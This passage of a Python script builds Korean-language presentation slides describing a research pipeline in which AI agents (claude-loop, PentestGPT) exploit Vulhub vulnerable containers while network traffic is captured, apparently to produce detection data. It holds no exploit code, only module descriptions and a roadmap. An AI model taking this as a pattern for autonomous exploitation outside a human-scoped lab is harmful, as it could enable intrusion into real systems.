    add_text(s, "핵심 의존성", 0.72, 5.32, 2.0, 0.3, size=13, color=YELLOW, bold=True)
    add_text(
        s,
        "정찰을 금지하므로 ‘모델이 익스플로잇을 이미 알고 있어야’ 한다. 모르면 실패 →\n"
        "그때는 PentestGPT(--engine pentestgpt, 탐색·리서치형) 또는 사람의 힌트로 보완.   "
        "성공률 < 100% · 난이도↑ → 예산(budget)↑",
        0.72, 5.66, 12.0, 0.75, size=12.3, color=WHITE,
    )

    # 17. Module breakdown ----------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "구현 모듈 + 테스트에서 실제 사용된 경로", "초록 = 이번 claude-loop 테스트에서 사용 · 회색 = 미사용(결정적 모드 전용)", 17, TOTAL)
    mods = [
        ("orchestrator.py", "CLI(run/agent) · baseline·기법 순환 재시도·oracle 디스패치·rich manifest · finally 완전 정리", CYAN, "✓ 사용", True),
        ("agent_runner.py", "claude-loop/pentestgpt · 기법·구조화 출력(T9_RESULT)·stop-on-proof·exploit 스크립트·benign", GREEN, "✓ 사용", True),
        ("environment.py", "Vulhub 수명주기 · VulhubTarget(경량/에이전트) · VulhubEnvironment(격리/결정적)", RED, "✓ 사용", True),
        ("collector.py", "tcpdump 사이드카(타깃 netns) · NDR PCAP · 응답본문/전체 토큰 검사(proof oracle)", PURPLE, "✓ 사용", True),
        ("models.py", "Pydantic 스키마 · Scenario·AgentConfig(기법뱅크·모델풀·baseline)·ProofSpec·Technique · MITRE 맵", YELLOW, "✓ 사용", True),
        ("planner.py", "결정적 모드 전용 · Claude/OpenAI 구조화 AttackPlan 생성", MUTED, "✗ 미사용", False),
        ("verification.py", "결정적 모드 전용 · marker·HTTP·명령 출력으로 성공 기계 검증", MUTED, "✗ 미사용", False),
        ("scenarios/ · tests/", "사람이 작성하는 JSON 카탈로그(표적·CVE 지정) · 단위/통합 테스트", WHITE, "✓ 입력", True),
    ]
    y = 1.45
    for name, desc, color, status, used in mods:
        panel_fill = PANEL if used else BG
        bar_c = color if used else MUTED
        name_c = color if used else MUTED
        desc_c = TEXT if used else MUTED
        status_c = GREEN if status.startswith("✓") else MUTED
        rect(s, 0.45, y, 12.43, 0.56, fill=panel_fill, line=BORDER)
        bar = s.shapes.add_shape(MSO_SHAPE.RECTANGLE, Inches(0.45), Inches(y), Inches(0.06), Inches(0.56))
        bar.fill.solid()
        bar.fill.fore_color.rgb = bar_c
        bar.line.fill.background()
        add_text(s, name, 0.64, y + 0.13, 2.5, 0.3, size=12.2, color=name_c, bold=True, font=MONO)
        add_text(s, desc, 3.22, y + 0.125, 6.95, 0.33, size=11.0, color=desc_c)
        add_text(s, status, 10.35, y + 0.13, 2.45, 0.3, size=11.0, color=status_c, bold=True, align=PP_ALIGN.RIGHT)
        y += 0.605
    add_text(
        s,
        "검증된 경로:  orchestrator → models → environment(VulhubTarget) → collector → agent_runner(claude-loop)",
        0.5, 6.42, 12.4, 0.4, size=12, color=GREEN, bold=True, align=PP_ALIGN.CENTER,
    )

    # 18. Status & roadmap ----------------------------------------------------
    s = prs.slides.add_slide(blank)
    _bg(s)
    title(s, "현재 상태와 다음 단계", "Phase 1 완료 — 이후 일관성 QC·다양성 배치·EDR 확장", 18, TOTAL)
    rect(s, 0.45, 1.5, 12.43, 1.5, fill=PANEL, line=GREEN)
    pill(s, "PHASE 1 — DONE", 0.7, 1.74, 2.1, GREEN, size=10)
    add_text(
        s,
        "claude-loop · NDR 캡처 · 완전 정리 · 기법 뱅크 · 4 proof oracle · baseline · 기법 재시도 · "
        "exploit 스크립트 · benign 네거티브 · 36 테스트 통과 · $0.5 cap",
        0.7, 2.14, 12.0, 0.78, size=12.5, color=WHITE,
    )
    phases = [
        ("PHASE 2", "일관성 QC · 지표", CYAN, [
            "선언 전술과 실제 기법 교차검증",
            "주제 이탈 실행 자동 플래그",
            "다양성 지표·기법 커버리지 산출",
        ]),
        ("PHASE 3", "다양성 배치", PURPLE, [
            "--repeat N + 반복 방지 메모리",
            "기법 커버리지 극대화",
            "N개 샘플 인덱싱·관리",
        ]),
        ("PHASE 4", "EDR 확장", YELLOW, [
            "Linux 컨테이너 Process·File 수집",
            "이후 Windows · VM lifecycle",
            "NDR + EDR 시간 동기화",
        ]),
    ]
    xs = [0.5, 4.52, 8.54]
    for x, (phase, heading, color, items) in zip(xs, phases):
        rect(s, x, 3.25, 3.8, 3.05, fill=PANEL, line=color)
        pill(s, phase, x + 0.26, 3.5, 1.28, color, size=10)
        add_text(s, heading, x + 0.26, 3.96, 3.3, 0.36, size=15, color=color, bold=True)
        bullet_list(s, items, x + 0.26, 4.45, 3.3, 1.7, size=11.8, bullet_color=color)
    add_text(
        s,
        "원칙 유지: 사람이 표적 지정 · 에이전트는 통제된 자유 · 토큰 최소화 · 수집 후 완전 정리",
        0.6, 6.55, 12.2, 0.35, size=13, color=WHITE, bold=True, align=PP_ALIGN.CENTER,
    )

    return prs


if __name__ == "__main__":
    presentation = build()
    presentation.save(OUT)
    print(OUT)
